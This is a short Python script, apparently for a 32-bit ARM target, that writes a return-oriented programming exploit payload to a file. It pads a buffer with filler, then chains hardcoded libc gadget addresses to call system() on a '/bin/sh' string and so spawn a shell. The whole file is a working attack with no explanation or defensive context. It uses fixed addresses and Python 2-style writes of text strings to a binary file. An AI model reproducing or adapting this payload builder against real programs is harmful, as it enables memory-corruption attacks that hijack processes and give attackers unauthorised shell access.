#rop-exploit.py
import struct

libc = 0xb6e74000
gadget1 = 0x7753c
gadget2 = 0x109248+4
gadget3 = 0xf7794

bin_sh_address = 0xb6fb0110
system = 0xb6eab154

f = open('rop-exploit.bin','wb')
f.write('B'*24)                         # Filler
f.write(struct.pack('<I', libc + gadget1))
f.write('sh;X')
f.write(struct.pack('<I', bin_sh_address - 8))
f.write(struct.pack('<I', libc + gadget2))
f.write('B'*20)                         # Filler
f.write(struct.pack('<I', system))
f.write(struct.pack('<I', bin_sh_address))
f.write(struct.pack('<I', libc + gadget3))
f.close()
